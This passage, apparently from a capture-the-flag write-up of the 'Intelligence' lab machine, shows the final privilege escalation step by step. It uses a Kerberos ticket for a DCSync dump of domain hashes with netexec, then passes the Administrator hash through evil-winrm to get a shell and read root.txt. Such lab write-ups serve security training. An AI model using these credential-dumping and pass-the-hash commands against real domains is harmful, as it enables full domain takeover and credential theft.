Finally, let’s export this ticket and perform a DCSync attack to get the Administrator’s hash:

```bash
$ export KRB5CCNAME=Administrator@cifs_dc.intelligence.htb@INTELLIGENCE.HTB.ccache

$ netexec smb intelligence.htb --use-kcache --ntds --user Administrator
SMB         intelligence.htb 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         intelligence.htb 445    DC               [+] intelligence.htb\Administrator from ccache (Pwn3d!)
SMB         intelligence.htb 445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         intelligence.htb 445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:907511<REDACTED>:::
<SNIP>
```

Fantastic.

### RCE as Administrator

Let’s use `evil-winrm` to establish a shell as Administrator and read `root.txt`:

```bash
$ evil-winrm -i intelligence.htb -u Administrator -H 907511<REDACTED>
<SNIP>
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       11/27/2025   1:41 PM             34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
d1fc0b<REDACTED>
```
